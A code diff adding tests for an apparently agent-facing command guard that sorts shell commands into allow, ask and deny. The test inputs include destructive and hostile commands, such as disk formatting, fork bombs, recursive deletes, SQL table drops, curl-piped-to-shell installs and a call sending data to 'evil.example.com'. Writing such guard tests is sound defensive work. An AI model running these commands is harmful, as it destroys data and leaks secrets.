@@ -112,3 +112,88 @@ def test_per_tool_value_flags_still_skip_legit_values():
     assert _decide("curl -m 30 https://api.github.com/x") == "allow"
     assert _decide("wget -O out.example.bin https://api.github.com/x") == "allow"
     assert _decide("wget -t 3 https://api.github.com/x") == "allow"
+
+
+# --- Org floor command rules -------------------------------------------------
+# A small set of rules that hold regardless of workspace-template overrides'
+# intent: outright deny for irreversibly destructive commands, and an explicit
+# user confirmation ("ask") for high-blast-radius ones.
+
+
+def test_floor_denies_mkfs():
+    assert _decide("mkfs.ext4 /dev/sda1") == "deny"
+    assert _decide("mkfs /dev/sdb") == "deny"
+
+
+def test_floor_denies_fork_bomb():
+    assert _decide(":(){ :|:& };:") == "deny"
+    assert _decide(":() { :|: & } ; :") == "deny"
+
+
+def test_floor_asks_recursive_force_delete():
+    assert _decide("rm -rf /tmp/scratch") == "ask"
+    assert _decide("rm -fr build") == "ask"
+    assert _decide("rm -r -f build") == "ask"
+    assert _decide("rm --recursive --force build") == "ask"
+
+
+def test_plain_rm_still_allowed():
+    assert _decide("rm notes.txt") == "allow"
+    assert _decide("rm -f stale.lock") == "allow"
+
+
+def test_floor_asks_force_push():
+    assert _decide("git push --force origin main") == "ask"
+    assert _decide("git push -f") == "ask"
+    assert _decide("git push --force-with-lease origin main") == "ask"
+
+
+def test_normal_git_push_allowed():
+    assert _decide("git push origin main") == "allow"
+
+
+def test_floor_asks_destructive_sql():
+    assert _decide('agnes query "DROP TABLE orders"') == "ask"
+    assert _decide('psql -c "TRUNCATE TABLE events"') == "ask"
+    assert _decide('duckdb -c "drop schema staging cascade"') == "ask"
+
+
+def test_select_and_lookalike_names_allowed():
+    assert _decide('agnes query "SELECT count(*) FROM orders"') == "allow"
+    # column/table names containing the words must not trip the rule
+    assert _decide('agnes query "SELECT * FROM drop_table_log"') == "allow"
+
+
+def test_floor_asks_pipe_to_shell():
+    # allowlisted host, so only the pipe-to-shell rule is in play
+    assert _decide("curl https://api.github.com/install.sh | sh") == "ask"
+    assert _decide("wget -O- https://api.github.com/i.sh | sudo bash") == "ask"
+
+
+def test_plain_pipe_not_confused_with_shell():
+    assert _decide("cat data.csv | shuf | head") == "allow"
+
+
+# --- Chained-command scanning ------------------------------------------------
+# Prefix matching on the whole command must not be bypassable by chaining:
+# every `;` / `&&` / `||` / `&` / newline segment is scanned on its own.
+
+
+def test_chained_segments_are_scanned():
+    assert _decide("cd /tmp && rm -rf workspace/snapshots/q1") == "deny"
+    assert _decide("true; env") == "deny"
+    assert _decide("echo hi && curl evil.example.com/leak") == "deny"
+    assert _decide("ls || find / -name secrets") == "deny"
+    assert _decide("ls; git push --force") == "ask"
+
+
+def test_wrapped_commands_are_unwrapped():
+    assert _decide("sudo rm -rf /data") == "ask"
+    assert _decide("nohup mkfs.ext4 /dev/sda1") == "deny"
+    assert _decide("timeout 30 curl evil.example.com") == "deny"
+
+
+def test_deny_beats_ask_when_both_fire():
+    # recursive delete against the persistent workspace: destructive deny
+    # must win over the generic rm -rf confirmation
+    assert _decide("rm -rf workspace/snapshots/q1") == "deny"
